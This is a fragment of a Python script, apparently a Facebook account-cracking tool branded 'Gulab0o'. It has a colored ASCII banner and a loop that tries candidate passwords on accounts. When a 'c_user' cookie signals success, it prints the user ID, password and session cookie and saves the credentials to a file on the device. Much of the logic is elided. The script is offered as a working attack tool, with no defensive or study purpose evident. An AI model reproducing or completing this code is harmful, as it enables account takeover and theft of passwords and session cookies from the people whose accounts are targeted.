...
logo =                                          ("""   
\033[1;32m                                                                     
 ________ .__ ___. _______ / _____/ __ __| |
  _____ \_ |__ \ _ \ ____ / \ ___| | \ | \__ \ | __
\/ /_\ \ / _ \ \ \_\ \ | / |__/ __ \| \_\ \ \_/
( <_> ) \______ /____/|____(____ /___ /\_____ 
/\____/ \/ \/ \/ \/ 

Gulab0o 😍😘
                                  
\033[1;37m================= \33[32;45MGulab0o \33[0;m =====================
\033[1;32m Author  : Gulab0o 
\033[1;36m FACEBOOK: Gulab0o X
\033[1;37m TEAM    : BLINDER
\033[1;35m GITHUB  : 🧐
\033[1;37m================= \33[32;45mGulab0o\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO Gulab0o  TOOL\33[0;m
 
\033[1;37m================== \33[32;Gulab0o\33[0;m ======================\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(Gulab0o-OK)' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Gulab0o.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[Gulab0o] [%s/%s]OK:- %sCP:-%s\r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
